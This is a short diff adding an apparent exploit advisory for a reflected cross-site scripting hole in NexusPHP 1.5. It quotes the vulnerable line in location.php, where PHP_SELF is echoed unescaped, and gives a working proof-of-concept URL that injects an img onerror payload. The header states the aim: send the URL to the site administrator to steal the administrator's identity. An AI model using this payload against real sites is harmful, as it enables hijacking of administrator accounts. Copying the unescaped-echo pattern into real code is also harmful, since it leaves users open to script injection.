@@ -1,0 +1,17 @@
+# by yangchonghui
+
+'''
+	Send URL to the web administrator to complete the attack,get the administrator's identity
+
+	Source:
+		location.php:20
+	echo("Location successfuly removed, click <a class=altlink href=" . $_SERVER['PHP_SELF'] .">here</a> to go back.");	Affected software: NexusPHP 1.5
+	Software Link: http://sourceforge.net/projects/nexusphp/
+
+	Free to modify and redistribute this program.
+	Use at your own risk and you are responsible for what you are doing.
+'''
+
+exploit:
+php.ini cgi.fix_pathinfo=On
+http://localhost/location.php/'%3E%3Cimg%20src=x%20onerror=alert(1)%3E
